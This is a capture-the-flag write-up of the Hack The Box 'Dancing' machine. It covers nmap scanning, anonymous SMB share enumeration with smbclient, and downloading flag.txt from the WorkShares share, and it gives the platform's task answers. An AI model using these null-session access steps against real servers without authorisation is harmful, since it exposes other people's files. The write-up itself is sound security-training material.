---
title: "Hack The Box — Starting Point: Dancing Writeup"
date: 2026-03-12 00:00:00 +0800
categories: [CTF, HTB-StartingPoint]
tags: [htb, starting-point, smb, nmap, openvpn, windows]
image:
  path: /assets/img/dancing-badge.jpeg
  
  alt: Hack The Box Dancing
description: Writeup for Hack The Box Starting Point — Dancing. Covers VPN setup, Nmap scanning, and exploiting a misconfigured SMB service with anonymous access enabled.
---

---

## Overview

This machine focuses on **SMB (Server Message Block)** enumeration and exploitation of a misconfigured SMB share that permits unauthenticated null session access. The objective is to navigate the accessible share and retrieve the `flag.txt` file.

---

## Task Questions & Answers

**Task 1: What does the 3-letter acronym SMB stand for?**  
`Server Message Block`

**Task 2: What port does SMB use to operate at?**  
`445`

**Task 3: What is the service name for port 445 that came up in our Nmap scan?**  
`microsoft-ds`

**Task 4: What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?**  
`-L`

**Task 5: How many shares are there on Dancing?**  
`4`

**Task 6: What is the name of the share we are able to access in the end with a blank password?**  
`WorkShares`

**Task 7: What is the command we can use within the SMB shell to download the files we find?**  
`get`

---

## Walkthrough

### Step 1 — Connect to the VPN and Start the Machine

Establish a connection to the HTB network via OpenVPN, then start the Dancing machine to obtain the target IP address:

```bash
sudo openvpn ~/Downloads/starting_point_eu-starting-point-2-dhcp.ovpn
```

Allow the VPN tunnel to establish fully, then open a new terminal tab to proceed.

![OpenVPN connected](/assets/img/dancing-1.jpeg)

![Machine started](/assets/img/dancing-5.jpeg)

---

### Step 2 — Verify Connectivity

Confirm the target is reachable by sending ICMP echo requests:

```bash
ping <target_ip>
```

A successful reply confirms network connectivity to the target host.

---

### Step 3 — Enumerate Open Ports with Nmap

Perform a service version scan to identify open ports and the software running on them:

```bash
nmap -sV <target_ip>
```

**Sample output:**

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port **445** is open running **microsoft-ds**, confirming an active SMB service on a Windows host.

![Nmap scan result](/assets/img/dancing-2.jpeg)

---

### Step 4 — Enumerate SMB Shares

Use `smbclient` with the `-L` flag to list all available shares on the target. The `-N` flag suppresses the password prompt, attempting a null session:

```bash
smbclient -L 10.129.13.197 -N
```

**Output:**

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

There are **4 shares** in total. `ADMIN$` and `C$` are default administrative shares that typically require elevated credentials. `WorkShares` has no comment or restriction, making it a prime candidate for anonymous access.

---

### Step 5 — Access the WorkShares Share

Attempt to connect to the `WorkShares` share using a null session (blank password):

```bash
smbclient \\\\10.129.13.197\\WorkShares -N
```

A successful connection drops you into the SMB shell. List the contents of the share:

```bash
ls
```

**Output:**

```
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021
```

Two user directories are present — **Amy.J** and **James.P**.

---

### Step 6 — Locate and Download the Flag

Navigate into each directory to search for the flag. The flag is found inside **James.P**:

```bash
cd James.P
ls
```

**Output:**

```
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021
```

Download the file using the `get` command:

```bash
get flag.txt
```

Then exit the SMB session:

```bash
exit
```

![SMB session and flag download](/assets/img/dancing-3.jpeg)

---

### Step 7 — Read the Flag

Back in the local terminal, display the flag contents:

```bash
cat flag.txt
```

The flag value will be printed to the terminal. Submit it on the HTB platform to complete the machine.

![Flag captured](/assets/img/dancing-4.jpeg)

---

## Summary

| Step | Action | Command |
|------|--------|---------|
| 1 | Connect to VPN | `sudo openvpn <config>.ovpn` |
| 2 | Verify connectivity | `ping <target_ip>` |
| 3 | Enumerate services | `nmap -sV <target_ip>` |
| 4 | List SMB shares | `smbclient -L <target_ip> -N` |
| 5 | Access WorkShares | `smbclient \\\\<target_ip>\\WorkShares -N` |
| 6 | Download flag | `cd James.P` → `get flag.txt` |
| 7 | Read the flag | `cat flag.txt` |

**Key Takeaway:** Misconfigured SMB shares that allow null session (anonymous) access can expose sensitive files to unauthenticated users. Always enforce authentication on SMB shares and restrict access using proper ACLs (Access Control Lists).
